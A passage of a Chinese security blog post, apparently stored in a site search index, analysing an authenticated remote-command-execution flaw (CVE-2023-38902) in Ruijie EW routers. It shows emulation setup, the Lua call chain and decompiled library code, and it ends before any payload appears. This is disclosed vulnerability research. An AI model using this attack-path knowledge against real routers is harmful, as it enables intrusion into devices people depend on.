<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>关于锐捷网络EW系列路由器存在授权后RCE漏洞的研究</title>
    <url>/posts/cf175daa.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这是我收获的第一个 <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-38902">CVE</a> 编号，在复现了 <strong>winmt</strong> 师傅的 <code>CVE-2023-34644</code> 后，他告诉我最新的固件虽然做了一些简单的处理，导致无法在未授权的情况下 <code>RCE</code> ，但因为没有从根源上对命令执行点做限制，所以在授权后，仍然可以进行 <code>RCE</code> 。我对最新的固件进行了分析，完整记录了授权后的 <code>RCE</code> 漏洞从分析到利用的过程。从提交漏洞到现在也有半年的时间了，并且锐捷官网也已经发布了最新的固件，现将该文章分享出来，供大家进行学习和研究。</p>
<span id="more"></span>	

<p>PS:本文记录的部分内容和 <a href="https://zikh26.github.io/posts/e5651b4f.html">站在巨人肩膀上复现CVE-2023-34644 | ZIKH26’s Blog</a> 这篇文章中的部分内容有相似之处，因为对前期的 <code>lua</code> 文件分析基本一致。为了保证读任何一篇单独的文章都较为通顺和连贯，因此就保留了两篇文章中相似的部分。</p>
<h2 id="仿真环境搭建"><a href="#仿真环境搭建" class="headerlink" title="仿真环境搭建"></a>仿真环境搭建</h2><p>仿真环境搭建请参考 <a href="https://bbs.kanxue.com/thread-277386.htm#msg_header_h2_4">https://bbs.kanxue.com/thread-277386.htm#msg_header_h2_4</a></p>
<p>该文章详细记录了锐捷 <code>EW</code> 型号路由器的仿真过程</p>
<p><code>qemu</code> 的启动脚本如下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">sudo qemu-system-mipsel \</span><br><span class="line">    -cpu 74Kf \</span><br><span class="line">    -M malta \</span><br><span class="line">    -kernel vmlinux-3.2.0-4-4kc-malta \</span><br><span class="line">    -hda debian_squeeze_mipsel_standard.qcow2 \</span><br><span class="line">    -append &quot;root=/dev/sda1 console=tty0&quot; \</span><br><span class="line">    -net nic \</span><br><span class="line">    -net tap,ifname=tap0,script=no,downscript=no \</span><br><span class="line">    -nographic</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>其中的 <code> vmlinux-3.2.0-4-4kc-malta</code> 和 <code>debian_squeeze_mipsel_standard.qcow2</code>  文件从 <a href="https://people.debian.org/~aurel32/qemu/mipsel/">https://people.debian.org/~aurel32/qemu/mipsel/</a>   进行下载</p>
<p>在执行 <code>qemu</code> 启动脚本之前，执行下面的脚本，创建一个网桥</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">sudo ifconfig eth0 down                 <span class="comment"># 首先关闭宿主机网卡接口</span></span></span><br><span class="line">sudo brctl addbr br0                     # 添加一座名为 br0 的网桥</span><br><span class="line">sudo brctl addif br0 ens33                # 在 br0 中添加一个接口</span><br><span class="line">sudo brctl stp br0 off                   # 如果只有一个网桥，则关闭生成树协议</span><br><span class="line">sudo brctl setfd br0 1                   # 设置 br0 的转发延迟</span><br><span class="line">sudo brctl sethello br0 1                # 设置 br0 的 hello 时间</span><br><span class="line">sudo ifconfig br0 0.0.0.0 promisc up     # 启用 br0 接口</span><br><span class="line">sudo ifconfig ens33 0.0.0.0 promisc up    # 启用网卡接口</span><br><span class="line">sudo dhclient br0                        # 从 dhcp 服务器获得 br0 的 IP 地址</span><br><span class="line">sudo brctl show br0                      # 查看虚拟网桥列表</span><br><span class="line">sudo brctl showstp br0                   # 查看 br0 的各接口信息</span><br><span class="line">sudo tunctl -t tap0 -u root              # 创建一个 tap0 接口，只允许 root 用户访问</span><br><span class="line">sudo brctl addif br0 tap0                # 在虚拟网桥中增加一个 tap0 接口</span><br><span class="line">sudo ifconfig tap0 0.0.0.0 promisc up    # 启用 tap0 接口</span><br><span class="line">sudo brctl showstp br0</span><br></pre></td></tr></table></figure>







<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="lua文件调用链分析"><a href="#lua文件调用链分析" class="headerlink" title="lua文件调用链分析"></a>lua文件调用链分析</h3><h4 id="lua新版本219-调用链分析"><a href="#lua新版本219-调用链分析" class="headerlink" title="lua新版本219 调用链分析"></a>lua新版本219 调用链分析</h4><p>在 <code>usr/lib/lua/luci/modules/cmd.lua</code> 文件中有如下代码，容易让初学者搞混，所以在此简单说明一下</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="keyword">local</span> opt = &#123;<span class="string">&quot;add&quot;</span>, <span class="string">&quot;del&quot;</span>, <span class="string">&quot;update&quot;</span>, <span class="string">&quot;get&quot;</span>, <span class="string">&quot;set&quot;</span>, <span class="string">&quot;clear&quot;</span>, <span class="string">&#x27;doc&#x27;</span>&#125;</span><br><span class="line">acConfig, devConfig, devSta, devCap = &#123;&#125;, &#123;&#125;, &#123;&#125;, &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i = <span class="number">1</span>, #opt <span class="keyword">do</span></span><br><span class="line">......</span><br><span class="line">    devSta[opt[i]] = <span class="function"><span class="keyword">function</span><span class="params">(params)</span></span> </span><br><span class="line">        <span class="keyword">local</span> model = <span class="built_in">require</span> <span class="string">&quot;dev_sta&quot;</span></span><br><span class="line">        params.method = opt[i]</span><br><span class="line">        params.cfg_cmd = <span class="string">&quot;dev_sta&quot;</span></span><br><span class="line">        <span class="keyword">local</span> data, back, ip, password, shell = doParams(params)</span><br><span class="line">        <span class="keyword">return</span> fetch(model.fetch, shell, params, opt[i], params.<span class="built_in">module</span>, data, back, ip, password)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">......    </span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>首先是先定义了一个表 <code>opt</code> 里面装了字符串 <code>add</code>  <code>del</code> <code>upload</code> 等字符串，然后又定义了四张空表 <code>acConfig</code> <code>devConfig</code> <code>devSta</code> <code>devCap</code> ，接下来是一个 <code>for</code> 循环来遍历 <code>opt</code> 表。</p>
<p>以 <code>devSta[opt[i]] = function(params) </code> 这行代码为例，假设现在 <code>opt[i]</code> 是元素 <code>add</code>，<code>function(params)</code> 这里是声明了一个匿名函数，因为函数也是一个变量，这个变量被直接存储到了 <code>devSta</code> 表中，以键值的形式存在，键就是字符串 <code>add</code> 而值就是这个函数，之后调用这个函数的话可以直接写 <code>devSta[&quot;add&quot;]()</code>    </p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hello</span><span class="params">()</span></span></span><br><span class="line">        <span class="keyword">local</span> model = <span class="built_in">require</span> <span class="string">&quot;dev_sta&quot;</span></span><br><span class="line">        params.method = opt[i]</span><br><span class="line">        params.cfg_cmd = <span class="string">&quot;dev_sta&quot;</span></span><br><span class="line">        <span class="keyword">local</span> data, back, ip, password, shell = doParams(params)</span><br><span class="line">        <span class="keyword">return</span> fetch(model.fetch, shell, params, opt[i], params.<span class="built_in">module</span>, data, back, ip, password)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line">devSta[<span class="string">&quot;add&quot;</span>] = hello <span class="comment">--假设此时遍历到了opt表中的add元素</span></span><br></pre></td></tr></table></figure>

<p>为什么特别说明这里呢？因为我在开始分析的时候，我一直以为这里是匹配到对应的键值后直接去执行函数，导致在此处执行了 <code>doParams</code> <code>fetch</code> 函数（实际上通过上面的分析也知道，这里只是定义了这些函数，并没有进行调用）</p>
<p>下面开始正式从入口分析 <code>/api/cmd</code> 的这条链，在 <code>/usr/lib/lua/luci/controller/eweb/api.lua</code> 文件中存在 <code>entry(&#123;&quot;api&quot;, &quot;cmd&quot;&#125;, call(&quot;rpc_cmd&quot;), nil)</code> 这行代码，意味着授权后访问 <code>/api/cmd</code> 路径时，可以调用 <code>rpc_cmd</code> 函数</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rpc_cmd</span><span class="params">()</span></span></span><br><span class="line">    <span class="keyword">local</span> jsonrpc = <span class="built_in">require</span> <span class="string">&quot;luci.utils.jsonrpc&quot;</span></span><br><span class="line">    <span class="keyword">local</span> http = <span class="built_in">require</span> <span class="string">&quot;luci.http&quot;</span></span><br><span class="line">    <span class="keyword">local</span> ltn12 = <span class="built_in">require</span> <span class="string">&quot;luci.ltn12&quot;</span></span><br><span class="line">    <span class="keyword">local</span> _tbl = <span class="built_in">require</span> <span class="string">&quot;luci.modules.cmd&quot;</span></span><br><span class="line">    http.prepare_content(<span class="string">&quot;application/json&quot;</span>)</span><br><span class="line">    ltn12.pump.all(jsonrpc.handle(_tbl, http.source()), http.<span class="built_in">write</span>)</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p>通过分析 <code>rpc_cmd</code> 函数得知 <code>_tbl</code> 已经包含了 <code>cmd.lua</code> 中所有变量的定义（上文已经分析过了），主要是 <code>ac_config</code> <code>dev_config</code> <code>dev_sta</code> 这三个表包含了 <code>add</code> <code>del</code> <code>update</code> <code>get</code> <code>set</code> <code>clear</code> <code>doc</code> 这些操作，而 <code>devCap</code> 表只有 <code>get</code> ，相关代码如下</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="keyword">local</span> opt = &#123;<span class="string">&quot;add&quot;</span>, <span class="string">&quot;del&quot;</span>, <span class="string">&quot;update&quot;</span>, <span class="string">&quot;get&quot;</span>, <span class="string">&quot;set&quot;</span>, <span class="string">&quot;clear&quot;</span>, <span class="string">&#x27;doc&#x27;</span>&#125;</span><br><span class="line">acConfig, devConfig, devSta, devCap = &#123;&#125;, &#123;&#125;, &#123;&#125;, &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i = <span class="number">1</span>, #opt <span class="keyword">do</span></span><br><span class="line">    acConfig[opt[i]] = <span class="function"><span class="keyword">function</span><span class="params">(params)</span></span></span><br><span class="line">        <span class="keyword">local</span> model = <span class="built_in">require</span> <span class="string">&quot;ac_config&quot;</span></span><br><span class="line">        params.method = opt[i]</span><br><span class="line">        params.cfg_cmd = <span class="string">&quot;ac_config&quot;</span></span><br><span class="line">        <span class="keyword">local</span> data, back, ip, password, shell = doParams(params)</span><br><span class="line">        <span class="keyword">return</span> fetch(model.fetch, shell, params, opt[i], params.<span class="built_in">module</span>, data, back, ip, password)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    devConfig[opt[i]] = <span class="function"><span class="keyword">function</span><span class="params">(params)</span></span></span><br><span class="line">        <span class="keyword">local</span> model = <span class="built_in">require</span> <span class="string">&quot;dev_config&quot;</span></span><br><span class="line">        params.method = opt[i]</span><br><span class="line">        params.cfg_cmd = <span class="string">&quot;dev_config&quot;</span></span><br><span class="line">        <span class="keyword">local</span> data, back, ip, password, shell = doParams(params)</span><br><span class="line">        <span class="keyword">return</span> fetch(model.fetch, shell, params, opt[i], params.<span class="built_in">module</span>, data, back, ip, password)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    devSta[opt[i]] = <span class="function"><span class="keyword">function</span><span class="params">(params)</span></span> </span><br><span class="line">        <span class="keyword">local</span> model = <span class="built_in">require</span> <span class="string">&quot;dev_sta&quot;</span></span><br><span class="line">        params.method = opt[i]</span><br><span class="line">        params.cfg_cmd = <span class="string">&quot;dev_sta&quot;</span></span><br><span class="line">        <span class="keyword">local</span> data, back, ip, password, shell = doParams(params)</span><br><span class="line">        <span class="keyword">return</span> fetch(model.fetch, shell, params, opt[i], params.<span class="built_in">module</span>, data, back, ip, password)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">if</span> opt[i] == <span class="string">&quot;get&quot;</span> <span class="keyword">then</span></span><br><span class="line">        devCap[opt[i]] = <span class="function"><span class="keyword">function</span><span class="params">(params)</span></span></span><br><span class="line">            <span class="keyword">local</span> model = <span class="built_in">require</span> <span class="string">&quot;dev_cap&quot;</span></span><br><span class="line">            params.method = opt[i]</span><br><span class="line">            params.cfg_cmd = <span class="string">&quot;dev_cap&quot;</span></span><br><span class="line">            <span class="keyword">local</span> data, back, ip, password, shell = doParams(params)</span><br><span class="line">            <span class="keyword">return</span> fetch(model.fetch, shell, params, opt[i], params.<span class="built_in">module</span>, ip, password)</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">if</span> opt[i] == <span class="string">&quot;doc&quot;</span> <span class="keyword">then</span></span><br><span class="line">        syshell = <span class="function"><span class="keyword">function</span><span class="params">(params)</span></span></span><br><span class="line">            <span class="keyword">local</span> tool = <span class="built_in">require</span> <span class="string">&quot;luci.utils.tool&quot;</span></span><br><span class="line">            <span class="keyword">return</span> tool.doc(params)</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p>然后来看 <code>rpc_cmd</code> 函数中的这行代码 <code>ltn12.pump.all(jsonrpc.handle(_tbl, http.source()), http.write)</code></p>
<p><code>jsonrpc.handle</code> 函数的参数是 <code>_tbl</code> ，看下 <code>luci.utils.jsonrpc</code> 文件中的 <code>handle</code> 函数，发现又将参数 <code>tbl</code> 传给了 <code>resolve</code> ，同时传入的还有报文中的 <code>method</code> 字段</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">handle</span><span class="params">(tbl, rawsource, ...)</span></span></span><br><span class="line">......</span><br><span class="line">    <span class="keyword">if</span> stat <span class="keyword">then</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span>(json.method) == <span class="string">&quot;string&quot;</span> <span class="keyword">then</span></span><br><span class="line">            <span class="keyword">local</span> method = resolve(tbl, json.method)</span><br><span class="line">            <span class="keyword">if</span> method <span class="keyword">then</span></span><br><span class="line">                response = reply(json.jsonrpc, json.id, proxy(method, json.params <span class="keyword">or</span> &#123;&#125;))</span><br><span class="line">......</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>



<p><code>resolve</code> 函数主要是将 <code>mod</code> 表中存放键值对中的函数提取出来，假设 <code>method</code> 为 <code>devCap.get</code> ，那么下面的代码最后可以将匿名函数 <code>devCap[&quot;get&quot;]</code> 赋值给 <code>mod</code> 并返回</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">resolve</span><span class="params">(mod, method)</span></span></span><br><span class="line">    <span class="keyword">local</span> <span class="built_in">path</span> = luci.util.split(method, <span class="string">&quot;.&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> j = <span class="number">1</span>, #<span class="built_in">path</span> - <span class="number">1</span> <span class="keyword">do</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">type</span>(<span class="built_in">mod</span>) == <span class="string">&quot;table&quot;</span> <span class="keyword">then</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">        <span class="built_in">mod</span> = <span class="built_in">rawget</span>(<span class="built_in">mod</span>, <span class="built_in">path</span>[j])</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">mod</span> <span class="keyword">then</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="built_in">mod</span> = <span class="built_in">type</span>(<span class="built_in">mod</span>) == <span class="string">&quot;table&quot;</span> <span class="keyword">and</span> <span class="built_in">rawget</span>(<span class="built_in">mod</span>, <span class="built_in">path</span>[#<span class="built_in">path</span>]) <span class="keyword">or</span> <span class="literal">nil</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span>(<span class="built_in">mod</span>) == <span class="string">&quot;function&quot;</span> <span class="keyword">then</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">mod</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>



<p>分析 <code>proxy(method, json.params or &#123;&#125;)</code> 发现，将刚刚解析的返回值 <code>method</code> 被 <code>proxy</code> 函数当做参数，这里的 <code>method</code> 又传入了 <code>luci.util</code> 文件中的 <code>copcall</code> 函数</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">proxy</span><span class="params">(method, ...)</span></span></span><br><span class="line">    <span class="keyword">local</span> tool = <span class="built_in">require</span> <span class="string">&quot;luci.utils.tool&quot;</span></span><br><span class="line">    <span class="keyword">local</span> res = &#123;luci.util.copcall(method, ...)&#125;</span><br><span class="line">......</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>



<p><code>copcall</code> 函数主要是对 <code>coxpcall</code> 的一个封装</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">copcall</span><span class="params">(f, ...)</span></span></span><br><span class="line">	<span class="keyword">return</span> coxpcall(f, copcall_id, ...)</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>



<p>终于在 <code>coxpcall</code> 函数内部发现调用了 <code>f</code> </p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">coxpcall</span><span class="params">(f, err, ...)</span></span></span><br><span class="line">	<span class="keyword">local</span> res, co = oldpcall(<span class="built_in">coroutine</span>.<span class="built_in">create</span>, f)</span><br><span class="line">......</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p><code>oldpcall(coroutine.create, f)</code> 这行代码的目的是在一个新的协程中运行函数 <code>f</code> 。至此开始执行上面提到的匿名函数，重新回顾一下它的代码，该函数调用了 <code>doParams</code> 对 <code>json</code> 数据进行解析，随后调用了 <code>fetch</code> 函数</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line">devSta[opt[i]] = <span class="function"><span class="keyword">function</span><span class="params">(params)</span></span></span><br><span class="line">    <span class="keyword">local</span> model = <span class="built_in">require</span> <span class="string">&quot;dev_sta&quot;</span></span><br><span class="line">    params.method = opt[i]</span><br><span class="line">    params.cfg_cmd = <span class="string">&quot;dev_sta&quot;</span></span><br><span class="line">    <span class="keyword">local</span> data, back, ip, password, shell = doParams(params)</span><br><span class="line">    <span class="keyword">return</span> fetch(model.fetch, shell, params, opt[i], params.<span class="built_in">module</span>, data, back, ip, password)</span><br></pre></td></tr></table></figure>



<p>这个 <code>fetch</code> 函数在 <code>cmd.lua</code> 文件中已经定义了，这里调用了 <code>fn</code> 也就是 <code>fetch</code> 函数传入进来的第一个参数</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="keyword">local</span> <span class="function"><span class="keyword">function</span> <span class="title">fetch</span><span class="params">(fn, shell, params, ...)</span></span></span><br><span class="line">    <span class="built_in">require</span> <span class="string">&quot;luci.json&quot;</span></span><br><span class="line">    <span class="keyword">local</span> tool = <span class="built_in">require</span> <span class="string">&quot;luci.utils.tool&quot;</span></span><br><span class="line">    <span class="keyword">local</span> _start = <span class="built_in">os</span>.<span class="built_in">time</span>()</span><br><span class="line">    <span class="keyword">local</span> _res = fn(...)</span><br><span class="line">......</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>



<p><code>fetch</code> 函数的第一个参数为 <code>model.fetch</code> ，<code>model</code> 是 <code>require &quot;dev_cap.lua&quot;</code> 后的结果，所以在 <code>cmd.lua</code> 的 <code>fetch</code> 函数内部调用了 <code>dev_sta.lua</code> 文件中定义的 <code>fetch</code> 函数，该函数定义如下，能够看到最后是调用了 <code>/usr/lib/lua/libuflua.so</code> 文件中的 <code>client_call</code> 函数</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fetch</span><span class="params">(cmd, module, param, back, ip, password, force, not_change_configId, multi)</span></span></span><br><span class="line">    <span class="keyword">local</span> uf_call = <span class="built_in">require</span> <span class="string">&quot;libuflua&quot;</span></span><br><span class="line">......</span><br><span class="line">    <span class="keyword">local</span> stat = uf_call.client_call(ctype, cmd, <span class="built_in">module</span>, param, back, ip, password, force, not_change_configId, multi)</span><br><span class="line">    <span class="keyword">return</span> stat</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>



<p>用 <code>IDA</code> 打开 <code>/usr/lib/lua/libuflua.so</code> 文件，发现并没有看到有定义的 <code>client_call</code> 函数，不过发现了 <code>uf_client_call</code> 函数，猜测可能是程序内部进行了关联。<code>shift+f12</code> 搜索字符串发现并没有看到 <code>client_call</code> （如下图）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308231651514.png" alt="image-20230822105021327"></p>
<p>大概率说明 <code>IDA</code> 没有把 <code>client_call</code> 解析成字符串，而是解析成了代码。我这里用 <code>010Editor</code> 打开该文件进行搜索字符串 <code>client_call</code>，成功搜索到后发现其地址位于 <code>0xff0</code> 处</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308231651567.png" alt="image-20230822105722385" style="zoom:67%;" />



<p>可以看到 <code>IDA</code> 确实是将 <code>0xff0</code> 位置的数据当做了代码来解析，选中这部分数据，按 <code>a</code> ，就能以字符串的形式呈现了</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308231651468.png" alt="image-20230822105929868"></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308231651476.png" alt="image-20230822110053012"></p>
<p>对字符串 <code>client_call</code> 进行交叉引用，发现最终调用位置如下，<code>luaL_register</code> 是 <code>Lua</code> 中注册 <code>C</code> 语言编写的函数，它作用是将 <code>C</code> 函数添加到一个 <code>Lua</code> 模块中，使得这些 <code>C</code> 函数能够从 <code>Lua</code> 代码中被调用</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308231651426.png" alt="image-20230822111240902"></p>
<p>该函数的原型如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">luaL_register</span> <span class="params">(lua_State *L, <span class="type">const</span> <span class="type">char</span> *libname, <span class="type">const</span> luaL_Reg *l)</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>lua_State *L</code>：<code>Lua</code> 状态指针，代表了一个 <code>Lua</code> 解释器实例。</li>
<li><code>const char *libname</code>：模块的名称，这个名称会在 <code>Lua</code> 中作为一个全局变量存在，存放模块的函数。</li>
<li><code>const luaL_Reg *l</code>：一个结构体数组，包含要注册到模块中的函数的信息。每个结构体包含函数的名称和相应的 <code>C</code> 函数指针</li>
</ul>
<p>这里重点关注第三个参数，这就说明 <code>0x1101C</code> 的位置存放的是一个字符串以及一个函数指针（如下图），因此判断出 <code>client_call</code> 实际就定义在了 <code>sub_A00</code> 中</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308231651435.png" alt="image-20230822111950548"></p>
<p><code>sub_A00</code> 函数定义如下，可以看到最后是调用了 <code>uf_client_call</code> 函数，而在这之前的很多赋值操作如 <code>*(_DWORD *)(v3 + 12) = lua_tolstring(a1, 4, 0);</code> ，很容易能猜测到其实是在解析 <code>Lua</code> 传入的各个参数字段。在 <code>Lua</code> 的代码中 <code>uf_call.client_call(ctype, cmd, module, param, back, ip, password, force, not_change_configId, multi)</code> 这里传入了多个参数，但是 <code>sub_A00</code> 函数就一个参数 <code>a1</code> ，结合的操作分析出这里是在解析参数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_A00</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  v13[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  v2 = <span class="built_in">malloc</span>(<span class="number">52</span>);</span><br><span class="line">  v3 = v2;</span><br><span class="line">  <span class="keyword">if</span> ( v2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(v2, <span class="number">0</span>, <span class="number">52</span>);</span><br><span class="line">    v5 = <span class="number">4</span>;</span><br><span class="line">    *(_DWORD *)v3 = luaL_checkinteger(a1, <span class="number">1</span>);</span><br><span class="line">    *(_DWORD *)(v3 + <span class="number">4</span>) = luaL_checklstring(a1, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    v6 = luaL_checklstring(a1, <span class="number">3</span>, <span class="number">0</span>);</span><br><span class="line">    v7 = *(_DWORD *)v3;</span><br><span class="line">    *(_DWORD *)(v3 + <span class="number">8</span>) = v6;</span><br><span class="line">    <span class="keyword">if</span> ( v7 != <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_DWORD *)(v3 + <span class="number">12</span>) = lua_tolstring(a1, <span class="number">4</span>, <span class="number">0</span>);</span><br><span class="line">      *(_BYTE *)(v3 + <span class="number">41</span>) = lua_toboolean(a1, <span class="number">5</span>) == <span class="number">1</span>;</span><br><span class="line">      v5 = <span class="number">6</span>;</span><br><span class="line">      *(_BYTE *)(v3 + <span class="number">40</span>) = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    *(_DWORD *)(v3 + <span class="number">20</span>) = lua_tolstring(a1, v5, <span class="number">0</span>);</span><br><span class="line">    *(_DWORD *)(v3 + <span class="number">24</span>) = lua_tolstring(a1, v5 + <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    v8 = v5 + <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *(_DWORD *)v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *(_DWORD *)v3 == <span class="number">2</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v8 = v5 + <span class="number">3</span>;</span><br><span class="line">        *(_BYTE *)(v3 + <span class="number">43</span>) = lua_toboolean(a1, v5 + <span class="number">2</span>) == <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      *(_BYTE *)(v3 + <span class="number">43</span>) = lua_toboolean(a1, v5 + <span class="number">2</span>) == <span class="number">1</span>;</span><br><span class="line">      v8 = v5 + <span class="number">4</span>;</span><br><span class="line">      *(_BYTE *)(v3 + <span class="number">44</span>) = lua_toboolean(a1, v5 + <span class="number">3</span>) == <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    *(_BYTE *)(v3 + <span class="number">48</span>) = lua_toboolean(a1, v8) == <span class="number">1</span>;</span><br><span class="line">    v4 = uf_client_call(v3, v13, <span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">......    </span><br></pre></td></tr></table></figure>

<p><code>uf_client_call</code> 函数是一个引用外部库的函数，用 <code>grep</code> 在整个文件系统搜索字符串 <code>uf_client_call</code> ，结合 <code>/usr/lib/lua/libuflua.so</code> 文件中引用的外部库进行分析，最终判断出 <code>uf_client_call</code> 函数定义在 <code>/usr/lib/libunifyframe.so</code></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202308231651524.png" alt="image-20230822132450393"></p>
<p><code>uf_client_call</code> 函数首先判断了 <code>method</code> 的类型，然后解析出报文中各字段的值，并将其键值对添加到一个 <code>JSON</code> 对象中，接着将最终处理好的 <code>JSON</code> 对象转换为 <code>JSON</code> 格式的字符串，通过 <code>uf_socket_msg_write</code> 用 <code>socket</code> 套接字进行数据传输</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">uf_client_call</span><span class="params">(_DWORD *a1, <span class="type">int</span> a2, <span class="type">int</span> *a3)</span></span><br><span class="line">&#123;</span><br><span class="line">......</span><br><span class="line">  v5 = json_object_new_object();</span><br><span class="line">......</span><br><span class="line">  <span class="keyword">switch</span> ( *a1 )<span class="comment">//这里的*a1指的就是uf_call.client_call函数的第一个参数ctype,他取决于method它在dev_sta.lua文件中被赋值为了2</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">      v15 = ((<span class="type">int</span> (*)(<span class="type">void</span>))<span class="built_in">strlen</span>)() + <span class="number">10</span>;</span><br><span class="line">......</span><br><span class="line">      v13 = <span class="string">&quot;acConfig.%s&quot;</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_22;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      v14 = ((<span class="type">int</span> (*)(<span class="type">void</span>))<span class="built_in">strlen</span>)() + <span class="number">11</span>;</span><br><span class="line">......</span><br><span class="line">      v13 = <span class="string">&quot;devConfig.%s&quot;</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_22;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      v8 = ((<span class="type">int</span> (*)(<span class="type">void</span>))<span class="built_in">strlen</span>)() + <span class="number">8</span>;</span><br><span class="line">......</span><br><span class="line">      v13 = <span class="string">&quot;devSta.%s&quot;</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_22;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      v16 = ((<span class="type">int</span> (*)(<span class="type">void</span>))<span class="built_in">strlen</span>)() + <span class="number">8</span>;</span><br><span 